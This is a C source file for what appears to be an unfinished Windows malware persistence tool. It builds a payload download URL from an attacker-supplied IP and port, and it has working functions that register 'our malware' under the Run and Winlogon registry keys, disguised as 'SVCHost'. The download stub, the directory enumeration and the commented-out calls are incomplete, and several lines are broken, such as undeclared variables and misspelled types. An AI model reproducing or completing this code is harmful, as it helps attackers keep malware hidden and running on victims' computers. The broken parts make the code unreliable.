#include <ctype.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <windows.h>

#define PERS_NAME "SVCHost"
#define MAX_URL 2048

typedef struct _WRITABLE_DIR {
    char path[MAX_PATH];
} WRITABLE_DIR, *PWRITABLE_DIR;

BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char *path, int pathLen) {
    if (*count >= *capacity) {
        *capacity = (*capacity == 0) ? 16 : (*capacity * 2);
        *array = realloc(*array, (*capacity) * sizeof(WRITABLE_DIR));
        if (!*array) {
            printf("[-] Allocation failed");
            return FALSE;
        }
    }

    strncpy((*array)[*count].path, path, pathLen);
    (*array)[*count].path[pathLen] = '\0';
    (*count)++;
}

BOOL HasWriteAccess(PHANDLE pToken, LPCWSTR dirPath) {
    // Get security security descriptor
    BYTE sdBuffer[1024];
    PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR) sdBuffer;
    DWORD sdSize;

    if (!GetFileSecurityW(dirPath, DACL_SECURITY_INFORMATION, pSD, sdSize, &sdSize)) {
        return FALSE;
    }

    GENERIC_MAPPING mapping = { FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_GENERIC_EXECUTE, FILE_ALL_ACCESS};
    PRIVILIGE_SET priviliges;
    DWORD privLen = sizeof(priviliges);
    DWORD granted;
    BOOL access;

    MapGenericMask(&FILE_GENERIC_WRITE, &mapping);
    if (!AccessCheck(pSD, pToken, FILE_GENERIC_WRITE, &mapping, &priviliges, &privLen, &granted, &access)) {
        return FALSE;
    }
    return access;
}

BOOL GetWritableDirs(WRITABLE_DIR **wdirs, int *count, int *capacity) {
    // Get user token
    HANDLE uToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        printf("[-] Failed to get user's token\n");
        return FALSE;
    }
    

    CloseHandle(token);
}

VOID TranslateError(DWORD errCode, char **pErrMessage) {
	FormatMessageA(
	    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
	    NULL,
	    errCode,
	    0,
	    (LPSTR)pErrMessage,
	    0,
	    NULL);
}

BOOL FileExists(const char *path) {
	DWORD attrib = GetFileAttributesA(path);
	return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL IsExecutable(const char *path) {
	DWORD binaryType;
	LSTATUS stat = GetBinaryTypeA((LPCSTR)path, (LPDWORD)&binaryType);
	char *errMsg;
	DWORD errCode;
	if (stat == ERROR) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] Error: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	return TRUE;
}

BOOL DownloadUrl(const char* source) {
    return TRUE;
}

BOOL InjectRunRegistry(const char *malwareFull, int malwareFullLen) {
	HKEY hKey = NULL;
	const char *REG = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	DWORD errCode;
	char *errMsg = NULL;

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while opening the Run registry key: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while setting registry key: %s\n", errMsg);
		LocalFree(errMsg);
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("Run registry key set for: %s\n", malwareFull);
	return TRUE;
}

BOOL InjectWinlogonRegistry(const char *malwareFull, int malwareFullLen) {
	HKEY hKey = NULL;
	const char *REG = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
	DWORD errCode;
	char *errMsg = NULL;

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while opening the Winlogon registry key: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while setting registry key: %s\n", errMsg);
		LocalFree(errMsg);
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("Winlogon registry key set for: %s\n", malwareFull);
	return TRUE;
}

BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *exeLen, char *target, int *targetLen, int *port) {
	int opt;
	int iFlag = 0, eFlag = 0, tFlag = 0;
	*port = 80;
	while ((opt = getopt(argc, argv, "i:e:t:p:")) != -1) {
		switch (opt) {
			case 'i':
				*ipLen = strlen(optarg);
				memcpy(ip, optarg, *ipLen);
				ip[*ipLen] = '\0';
                iFlag = 1;
				break;
			case 'e':
				*exeLen = strlen(optarg);
				memcpy(exe, optarg, *exeLen);
				exe[*exeLen] = '\0';
				eFlag = 1;
				break;
            case 't':
                *targetLen = strlen(optarg);
                memcpy(target, optarg, *targetLen);
                target[*targetLen] = '\0';
                tFlag = 1;
                break;
			case 'p':
				BOOL valid = TRUE;
				for (int i = 0; optarg[i]; i++) {
					if (!isdigit((unsigned char)optarg[i])) {
						valid = FALSE;
						break;
					}
				}
				if (valid) {
					*port = atoi(optarg);
				} else {
					printf("[-] Invalid port specified\n");
					return FALSE;
				}
                break;
			default:
				return FALSE;
				break;
		}
	}
	if (!iFlag || !eFlag) {
		return FALSE;
	}
    if (!tFlag) {
        *targetLen = *exeLen;
        strncpy(target, exe, (*exeLen) + 1);
    }
	return TRUE;
}

int main(int argc, char* argv[]) {
	char malwareFull[MAX_PATH];
	int malwareFullLen;
	char exe[MAX_PATH];
	char ip[256];
    char target[MAX_PATH];
    int ipLen;
	int exeLen;
    int targetLen; 
    int port; 
    char source[MAX_URL];
    WRITABLE_DIR *wdirs = NULL;
    int capacity = 16, count = 0;

	if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port) == FALSE) {
        printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>]\n", argv[0]);
		exit(1);
	}

	snprintf(source, MAX_URL, "http://%s:%d/%s", ip, port, exe);
	printf("[*] Source to extract payload from: %s\n", source);
    printf("[*] Payload will be uploaded as: %s\n", target);

    // List available writable directories
    printf("[*] Listing available directories...\n\n");
    
	/*
	if (!FileExists(malware)) {
	    printf("[-] The malware does not exists\n");
	    return 1;
	}

	GetFullPathName(malware, MAX_PATH, malwareFull, NULL);
	malwareFullLen = strlen(malwareFull);
	malwareFull[malwareFullLen] = '\0';

	if (!IsExecutable(malwareFull)) {
	    return 1;
	}
	printf("[+] Valid malicious executable: %s\n[+] Starting to apply persistence techniques\n", malwareFull);
	*/
	// Try registry run key
	/*
	if (!InjectRunRegistry(malwareFull, malwareFullLen)) {
	    printf("[-] Persistence via Run Registry failed. Trying the next one\n");
	} else {
	    printf("[+] Persistence via Run Registry successful\n"); return 0; } */
	// Abusing Registry key used by Winlogon process
	/*
	if (!InjectWinlogonRegistry(malwareFull, malwareFullLen)) {
	    printf("[-] Persistence via Winlogon Registry failed. Trying the next one\n");
	} else {
	    printf("[+] Persistence via Winlogon Registry successful\n");
	    return 0;
	}
	*/
    free(wdirs);
	return 0;
}
